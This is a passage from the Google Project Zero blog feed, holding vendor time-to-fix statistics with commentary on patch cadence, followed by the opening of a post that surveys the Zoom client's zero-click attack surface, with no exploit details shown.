 <p class="c9"><span class="c4">Samsung</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">10</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">8 (80%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">2 (20%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">0 (0%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">72</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Oracle</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">7</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">3 (43%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">0 (0%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">4 (57%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">109</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span>Others</span><span class="c4">*</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">55</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">48 (87%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">3 (5%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">4 (7%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">44</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">TOTAL</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">346</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">294 (84%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">34 (10%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">18 (5%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">61</span></p></td></tr></tbody></table>
 <p class="c8"><span class="c22">* For completeness, the vendors included in the &quot;Others&quot; bucket are Apache, ASWF, Avast, AWS, c-ares, Canonical, F5, Facebook, git, Github, glibc, gnupg, gnutls, gstreamer, haproxy, Hashicorp, insidesecure, Intel, Kubernetes, libseccomp, libx264, Logmein, Node.js, opencontainers, QT, Qualcomm, RedHat, Reliance, SCTPLabs, Signal, systemd, Tencent, Tor, udisks, usrsctp, Vandyke, VietTel, webrtc, and Zoom.</span></p>
 <p class="c2"><span class="c37 c42"></span></p>
 <p class="c8"><span class="c4">Overall, the data show that almost all of the big vendors here are coming in under 90 days, on average. The bulk of fixes during a grace period come from Apple and Microsoft (22 out of 34 total).</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">Vendors have exceeded the deadline and grace period about 5% of the time over this period. In this slice, Oracle has exceeded at the highest rate, but admittedly with a relatively small sample size of only about 7 bugs. The next-highest rate is Microsoft, having exceeded 4 of their 80 deadlines.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>Average number of days to fix bugs across all vendors is 61 days. Zooming in on just that stat, we can break it out by year:</span></p>
 <p class="c9 c35"><span class="c4"></span></p><h3 class="c11" id="h.vez2bf9dw4kq"><span>Bug fix time 2019-2021, by bug report volume</span></h3><a id="t.0f46d6ef5bbf669008817a45d8194292e813c307"></a><a id="t.1"></a><table class="c13"><tbody><tr class="c24"><td class="c3" colspan="1" rowspan="1">
 <p class="c8"><span class="c26 c7">Vendor</span></p></td><td class="c25" colspan="1" rowspan="1">
 <p class="c0"><span class="c26 c7">Bugs in 2019</span></p>
 <p class="c0"><span class="c7 c26">(avg days to fix)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c26 c7">Bugs in 2020</span></p>
 <p class="c0"><span class="c26 c7">(avg days to fix)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c26 c7">Bugs in 2021</span></p>
 <p class="c0"><span class="c26 c7">(avg days to fix)</span></p></td></tr><tr class="c24"><td class="c3" colspan="1" rowspan="1">
 <p class="c8"><span class="c4">Apple</span></p></td><td class="c25" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">61 (71)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">13 (63)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">11 (64)</span></p></td></tr><tr class="c24"><td class="c3" colspan="1" rowspan="1">
 <p class="c8"><span class="c4">Microsoft</span></p></td><td class="c25" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">46 (85)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">18 (87)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">16 (76)</span></p></td></tr><tr class="c24"><td class="c3" colspan="1" rowspan="1">
 <p class="c8"><span class="c4">Google</span></p></td><td class="c25" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">26 (49)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">13 (22)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">17 (53)</span></p></td></tr><tr class="c24"><td class="c3" colspan="1" rowspan="1">
 <p class="c8"><span class="c4">Linux</span></p></td><td class="c25" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">12 (32)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">8 (22)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">5 (15)</span></p></td></tr><tr class="c24"><td class="c3" colspan="1" rowspan="1">
 <p class="c8"><span class="c4">Others*</span></p></td><td class="c25" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">54 (63)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">35 (54)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">14 (29)</span></p></td></tr><tr class="c24"><td class="c3" colspan="1" rowspan="1">
 <p class="c8"><span class="c4">TOTAL</span></p></td><td class="c25" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">199 (67)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">87 (54)</span></p></td><td class="c5" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">63 (52)</span></p></td></tr></tbody></table>
 <p class="c8"><span class="c37 c39">* For completeness, the vendors included in the &quot;Others&quot; bucket are Adobe, Apache, ASWF, Avast, AWS, c-ares, Canonical, F5, Facebook, git, Github, glibc, gnupg, gnutls, gstreamer, haproxy, Hashicorp, insidesecure, Intel, Kubernetes, libseccomp, libx264, Logmein, Mozilla, Node.js, opencontainers, Oracle, QT, Qualcomm, RedHat, Reliance, Samsung, SCTPLabs, Signal, systemd, Tencent, Tor, udisks, usrsctp, Vandyke, VietTel, webrtc, and Zoom.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">From this, we can see a few things: first of all, the overall time to fix has consistently been decreasing, but most significantly between 2019 and 2020. Microsoft, Apple, and Linux overall have reduced their time to fix during the period, whereas Google sped up in 2020 before slowing down again in 2021. Perhaps most impressively, the others not represented on the chart have collectively cut their time to fix in more than half, though it&#39;s possible this represents a change in research targets rather than a change in practices for any particular vendor.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">Finally, focusing on just 2021, we see:</span></p><ul style="padding: 0;" class="c41 lst-kix_9x4uh3knfz5m-0 start"><li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"><span>Only </span><span class="c17"><a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/list?colspec=ID%20Status%20Restrict%20Finder%20Reported%20Deadline%20Remaining%20CVE%20Vendor%20Product%20Summary&q=id%3E%3D2137%20Deadline%3DExceeded%20-Deadline-Grace&can=1">1 deadline exceeded</a></span><span class="c4">, versus an average of 9 per year in the other two years</span></li><li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"><span class="c4">The grace period used 9 times (notably with half being by Microsoft), versus the slightly lower average of 12.5 in the other years</span></li></ul><h1 class="c29" id="h.wdfygamerb2l"><span class="c31">Mobile phones</span></h1>
 <p class="c8"><span class="c4">Since the products in the previous table span a range of types (desktop operating systems, mobile operating systems, browsers), we can also focus on a particular, hopefully more apples-to-apples comparison: mobile phone operating systems. </span></p>
 <p class="c2"><span class="c4"></span></p><a id="t.db6b038cf533045efa428ca3d33366f0e9985107"></a><a id="t.2"></a><table class="c13"><tbody><tr class="c18"><td class="c28" colspan="1" rowspan="1">
 <p class="c9"><span class="c26 c7">Vendor</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c26 c7">Total bugs</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c26 c7">Avg fix time</span></p></td></tr><tr class="c18"><td class="c28" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">iOS</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">76</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">70</span></p></td></tr><tr class="c18"><td class="c28" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Android (Samsung)</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">10</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">72</span></p></td></tr><tr class="c18"><td class="c28" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Android (Pixel)</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">6</span></p></td><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">72</span></p></td></tr></tbody></table>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">The first thing to note is that it appears that iOS received remarkably more bug reports from Project Zero than any flavor of Android did during this time period, but rather than an imbalance in research target selection, this is more a reflection of how Apple ships software. Security updates for &quot;apps&quot; such as iMessage, Facetime, and Safari/WebKit are all shipped as part of the OS updates, so we include those in the analysis of the operating system. On the other hand, security updates for standalone apps on Android happen through the Google Play Store, so they are not included here in this analysis.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>Despite that, all three vendors have an extraordinarily similar average time to fix. </span><span>With the data we have available, it&#39;s hard to determine how much time is spent on each part of the vulnerability lifecycle (e.g. triage, patch authoring, testing, etc).</span><span>&nbsp;</span><span>However, open-source products do provide a window into where time is spent.</span></p><h1 class="c29" id="h.4ajnbffcm6lj"><span class="c31">Browsers</span></h1>
 <p class="c8"><span>For most software, we aren&#39;t able to dig into specifics of the timeline. Specifically: after a vendor receives a report of a security issue, how much of the &quot;time to fix&quot; is spent between the bug report and </span><span>landing the fix</span><span class="c4">, and how much time is spent between landing that fix and releasing a build with the fix? The one window we do have is into open-source software, and specific to the type of vulnerability research that Project Zero does, open-source browsers.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c7">Fix time analysis for open-source browsers</span><span class="c7">, by bug volume</span></p><a id="t.9206b02c8834a0124a61f8895479290be80060e3"></a><a id="t.3"></a><table class="c13"><tbody><tr class="c36"><td class="c19" colspan="1" rowspan="1">
 <p class="c27"><span class="c26 c7">Browser</span></p></td><td class="c32" colspan="1" rowspan="1">
 <p class="c0"><span class="c26 c7">Bugs</span></p></td><td class="c6" colspan="1" rowspan="1">
 <p class="c0"><span class="c7">Avg days from bug report to </span><span class="c7">public patch</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c26 c7">Avg days from public patch to release</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c26 c7">Avg days from bug report to release</span></p></td></tr><tr class="c18"><td class="c19" colspan="1" rowspan="1">
 <p class="c27"><span class="c4">Chrome</span></p></td><td class="c32" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">40</span></p></td><td class="c6" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">5.3</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">24.6</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">29.9</span></p></td></tr><tr class="c18"><td class="c19" colspan="1" rowspan="1">
 <p class="c27"><span class="c4">WebKit</span></p></td><td class="c32" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">27</span></p></td><td class="c6" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">11.6</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">61.1</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">72.7</span></p></td></tr><tr class="c40"><td class="c19" colspan="1" rowspan="1">
 <p class="c27"><span class="c4">Firefox</span></p></td><td class="c32" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">8</span></p></td><td class="c6" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">16.6</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">21.1</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">37.8</span></p></td></tr><tr class="c18"><td class="c19" colspan="1" rowspan="1">
 <p class="c27"><span class="c4">Total</span></p></td><td class="c32" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">75</span></p></td><td class="c6" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">8.8</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span class="c4">37.3</span></p></td><td class="c21" colspan="1" rowspan="1">
 <p class="c0"><span>46.1</span></p></td></tr></tbody></table>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">We can also take a look at the same data, but with each bug spread out in a histogram. In particular, the histogram of the amount of time from a fix being landed in public to that fix being shipped to users shows a clear story (in the table above, this corresponds to &quot;Avg days from public patch to release&quot; column:</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"></p>

 <p class="c8"><span class="c4"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8EedoaPfZt2MIFGOHQq8x9iAQIoXCuVi1hS1HgW3kANAbNgfXatf0AT2Jl7xmjS3Au1AMjKxkTQnoLdOSgGbYbQcssFKwJ3fc3o3zD693phsOZZJBRCBOcycrVKWOXLqCREMWntlix0jEH86DAHS5Mgdk5N53Cy1CujGePRECj3JvaqrF65974g2/s1226/image1%20%287%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8EedoaPfZt2MIFGOHQq8x9iAQIoXCuVi1hS1HgW3kANAbNgfXatf0AT2Jl7xmjS3Au1AMjKxkTQnoLdOSgGbYbQcssFKwJ3fc3o3zD693phsOZZJBRCBOcycrVKWOXLqCREMWntlix0jEH86DAHS5Mgdk5N53Cy1CujGePRECj3JvaqrF65974g2/s1226/image1%20%287%29.png" border="0" alt="Histogram showing the distributions of time from a fix landing in public to a fix shipping for Firefox, Webkit, and Chrome. The fact that Webkit is still on the higher end of the histogram tells us that most of their time is spent shipping the fixed build after the fix has landed." style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">The table and chart together tell us a few things:</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c7">Chrome is currently the fastest of the three browsers, with time from bug report to releasing a fix in the stable channel in 30 days</span><span>. The time to patch is very fast here, with just an average of 5 days between the bug report and the patch landing in public. The time for that patch to be released to the public is the bulk of the overall time window, though overall we still see the Chrome (blue) bars of the histogram toward the left side of the histogram. (Important note: despite being housed within the same company, </span><span>Project Zero</span><span>&nbsp;follows the same policies and procedures with Chrome that an external security researcher would follow. More information on that is available in our </span><span class="c17"><a class="c201" href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#earlyaccess">Vulnerability Disclosure FAQ</a></span><span class="c4">.)</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c7">Firefox comes in second in this analysis, though with a relatively small number of data points to analyze. Firefox releases a fix on average in 38 days</span><span class="c4">. A little under half of that is time for the fix to land in public, though it&#39;s important to note that Firefox intentionally delays committing security patches to reduce the amount of exposure before the fix is released. Once the patch has been made public, it releases the fixed build on average a few days faster than Chrome &ndash; with the vast majority of the fixes shipping 10-15 days after their public patch.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c7">WebKit is the outlier in this analysis, with the longest number of days to release a patch at 73 days</span><span>.</span><span class="c4">&nbsp;Their time to land the fix publicly is in the middle between Chrome and Firefox, but unfortunately this leaves a very long amount of time for opportunistic attackers to find the patch and exploit it prior to the fix being made available to users. This can be seen by the Apple (red) bars of the second histogram mostly being on the right side of the graph, and every one of them except one being past the 30-day mark. </span></p><h1 class="c29" id="h.bghb183lyinq"><span class="c31">Analysis, hopes, and dreams</span></h1>
 <p class="c8"><span>Overall, we see a number of promising trends emerging from the data. Vendors are fixing almost all of the bugs that they receive, and they generally do it within the 90-day deadline plus the 14-day grace period when needed.</span><span>&nbsp;Over the past three years vendors have, for the most part, </span><span>accelerated</span><span class="c4">&nbsp;their patch effectively reducing the overall average time to fix to about 52 days. In 2021, there was only one 90-day deadline exceeded. We suspect that this trend may be due to the fact that responsible disclosure policies have become the de-facto standard in the industry, and vendors are more equipped to react rapidly to reports with differing deadlines. We also suspect that vendors have learned best practices from each other, as there has been increasing transparency in the industry.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c7">One important caveat</span><span>: we are aware that reports from Project Zero may be outliers compared to other bug reports, in that they may receive faster action </span><span>as there is a tangible risk of public disclosure</span><span class="c4">&nbsp;(as the team will disclose if deadline conditions are not met) and Project Zero is a trusted source of reliable bug reports. We encourage vendors to release metrics, even if they are high level, to give a better overall picture of how quickly security issues are being fixed across the industry, and continue to encourage other security researchers to share their experiences.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>For Google, </span><span>and in particular Chrome, we suspect that the quick turnaround time on security bugs is in part due to their rapid release cycle, as well as their additional stable releases for security updates. We&#39;re encouraged by Chrome&#39;s recent switch from a 6-week release cycle to a </span><span class="c17"><a class="c201" href="https://blog.chromium.org/2021/03/speeding-up-release-cycle.html">4-week release cycle</a></span><span>.</span><span>&nbsp;</span><span>On the Android side, we see the Pixel variant of Android releasing fixes about on par with the Samsung variants as well as iOS. Even so, we encourage the Android team to look for additional ways to speed up the application of security updates and push that segment of the industry further.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>For Apple, we&#39;re pleased </span><span>with the</span><span>&nbsp;acceleration of patches landing, as well as the recent lack of use of grace periods as well as lack of missed deadlines. For WebKit in particular, we hope to see a reduction in the amount of time it takes between landing a patch and shipping it out to users, </span><span>especially since WebKit security affects all browsers used in iOS, as WebKit is the only browser engine permitted on</span><span>&nbsp;the iOS platform. </span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>For Microsoft, we suspect that the high time to fix and Microsoft&#39;s reliance on the grace period are consequences of the monthly cadence of Microsoft&#39;s &quot;patch Tuesday&quot; updates, which can make it more difficult for development teams to meet a disclosure deadline. We hope that Microsoft might consider implementing a more frequent patch cadence for security issues, or finding ways to further streamline their internal processes to land and ship code quicker.</span></p><h1 class="c29" id="h.ta2a9qyxrinj"><span class="c31">Moving forward</span></h1>
 <p class="c8"><span class="c4">This post represents some number-crunching we&#39;ve done of our own public data, and we hope to continue this going forward. Now that we&#39;ve established a baseline over the past few years, we plan to continue to publish an annual update to better understand how the trends progress.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>To that end, we&#39;d love to have even more insight into the processes and timelines of our vendors. We encourage all vendors to consider publishing </span><span>aggregate</span><span>&nbsp;data on their time-to-fix and time-to-patch for externally reported vulnerabilities. Through more transparency, information sharing, and collaboration across the industry, we believe we can learn from each other&#39;s best practices, better understand existing difficulties and hopefully make the internet a safer place for all.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/3889819885234441482/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/02/a-walk-through-project-zero-metrics.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/3889819885234441482
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/3889819885234441482
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/02/a-walk-through-project-zero-metrics.html
## @title
A walk through Project Zero metrics
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8EedoaPfZt2MIFGOHQq8x9iAQIoXCuVi1hS1HgW3kANAbNgfXatf0AT2Jl7xmjS3Au1AMjKxkTQnoLdOSgGbYbQcssFKwJ3fc3o3zD693phsOZZJBRCBOcycrVKWOXLqCREMWntlix0jEH86DAHS5Mgdk5N53Cy1CujGePRECj3JvaqrF65974g2/s72-c/image1%20%287%29.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-1246610633949568195
## published
18/01/2022 14:28:00
## updated
18/01/2022 14:28:18
## title
## @type
text
## #text
Zooming in on Zero-click Exploits
## content
## @type
html
## #text
<style type="text/css">ul.lst-kix_ef7dug197aaw-4{list-style-type:none}ul.lst-kix_ef7dug197aaw-3{list-style-type:none}.lst-kix_ef7dug197aaw-0>li:before{content:"-  "}ul.lst-kix_ef7dug197aaw-2{list-style-type:none}ul.lst-kix_ef7dug197aaw-1{list-style-type:none}.lst-kix_ef7dug197aaw-1>li:before{content:"-  "}ul.lst-kix_ef7dug197aaw-8{list-style-type:none}ul.lst-kix_ef7dug197aaw-7{list-style-type:none}ul.lst-kix_ef7dug197aaw-6{list-style-type:none}ul.lst-kix_ef7dug197aaw-5{list-style-type:none}ul.lst-kix_ef7dug197aaw-0{list-style-type:none}.lst-kix_ef7dug197aaw-7>li:before{content:"-  "}.lst-kix_ef7dug197aaw-6>li:before{content:"-  "}.lst-kix_ef7dug197aaw-8>li:before{content:"-  "}.lst-kix_ef7dug197aaw-5>li:before{content:"-  "}.lst-kix_ef7dug197aaw-3>li:before{content:"-  "}.lst-kix_ef7dug197aaw-2>li:before{content:"-  "}.lst-kix_ef7dug197aaw-4>li:before{content:"-  "}ol{margin:0;padding:0}table td,table th{padding:0}.c7{background-color:#ffffff;color:#222222;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c18{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.2222222222222223;orphans:2;widows:2;text-align:left}.c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c13{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c14{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13.5pt;font-family:"Arial";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c15{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:13.5pt;font-family:"Arial";font-style:normal}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c6{font-weight:400;font-family:"Courier New"}.c8{color:inherit;text-decoration:inherit}.c4{border:1px solid black;margin:5px}.c21{font-size:13.5pt;font-weight:700}.c11{background-color:#ffffff;color:#222222}.c20{background-color:#ffffff}.c19{margin-left:36pt}.c12{height:11pt}.c5{text-indent:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c16">
 <p class="c1"><span>Posted by Natalie Silvanovich, Project Zero</span></p>
 <p class="c1"><span><br></span><span>Zoom</span><span>&nbsp;is a video conferencing platform that has gained popularity throughout the pandemic. Unlike other video conferencing systems that I have investigated, where one user initiates a call that other users must immediately accept or reject, Zoom calls are typically scheduled in advance and joined via an email invitation. In the past, I hadn&rsquo;t prioritized reviewing Zoom because I believed that any attack against a Zoom client would require multiple clicks from a user. However, a zero-click attack against the Windows Zoom client was recently </span><span class="c17"><a class="c81" href="https://blog.zoom.us/zoom-sponsors-pwn2own-security-competition/">revealed</a></span><span>&nbsp;at Pwn2Own, showing that it does indeed have a fully remote attack surface. The following post details my investigation into Zoom.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>This analysis resulted in two vulnerabilities being</span><span>&nbsp;reported to Zoom. One was a buffer overflow that affected both Zoom clients and MMR servers, and one was an info leak that is only useful to attackers on MMR servers. Both of these vulnerabilities were fixed on November 24, 2021. </span></p><h2 class="c13" id="h.m2ive1t3pjbm"><span class="c10">Zoom Attack Surface Overview</span></h2>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">Zoom&rsquo;s main feature is multi-user conference calls called meetings that support a variety of features including audio, video, screen sharing and in-call text messages. There are several ways that users can join Zoom meetings. To start, Zoom provides full-featured installable clients for many platforms, including Windows, Mac, Linux, Android and iPhone. Users can also join Zoom meetings using a browser link, but they are able to use fewer features of Zoom. Finally, users can join a meeting by dialing phone numbers provided in the invitation on a touch-tone phone, but this only allows access to the audio stream of a meeting. This research focused on the Zoom client software, as the other methods of joining calls use existing device features.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">Zoom clients support several communication features other than meetings that are available to a user&rsquo;s Zoom Contacts. A Zoom Contact is a user that another user has added as a contact using the Zoom user interface. Both users must consent before they become Zoom Contacts. Afterwards, the users can send text messages to one another outside of meetings and start channels for persistent group conversations. Also, if either user hosts a meeting, they can invite the other user in a manner that is similar to a phone call: the other user is immediately notified and they can join the meeting with a single click. These features represent the zero-click attack surface of Zoom. Note that this attack surface is only available to attackers that have convinced their target to accept them as a contact. Likewise, meetings are part of the one-click attack surface only for Zoom Contacts, as other users need to click several times to enter a meeting.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">That said, it&rsquo;s likely not that difficult for a dedicated attacker to convince a target to join a Zoom call even if it takes multiple clicks, and the way some organizations use Zoom presents interesting attack scenarios. For example, many groups host public Zoom meetings, and Zoom supports a paid Webinar feature where large groups of unknown attendees can join a one-way video conference. It could be possible for an attacker to join a public meeting and target other attendees. Zoom also relies on a server to transmit audio and video streams, and end-to-end encryption is off by default. It could be possible for an attacker to compromise Zoom&rsquo;s servers and gain access to meeting data.</span></p>
 <p class="c0"><span class="c2"></span></p><h2 class="c13" id="h.l871so51iqig"><span class="c10">Zoom Messages</span></h2>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>I started out by looking at the zero-click attack surface of Zoom. Loading the Linux client into IDA, it appeared that a great deal of its server communication occurred over XMPP. Based on strings in the binary, it was clear that XMPP parsing was performed using a library called </span><span class="c17"><a class="c81" href="https://camaya.net/gloox/">gloox</a></span><span class="c2">. I fuzzed this library using AFL and other coverage-guided fuzzers, but did not find any vulnerabilities. I then looked at how Zoom uses the data provided over XMPP.</span></p>
 <p class="c0"><span class="c2"></span></p>
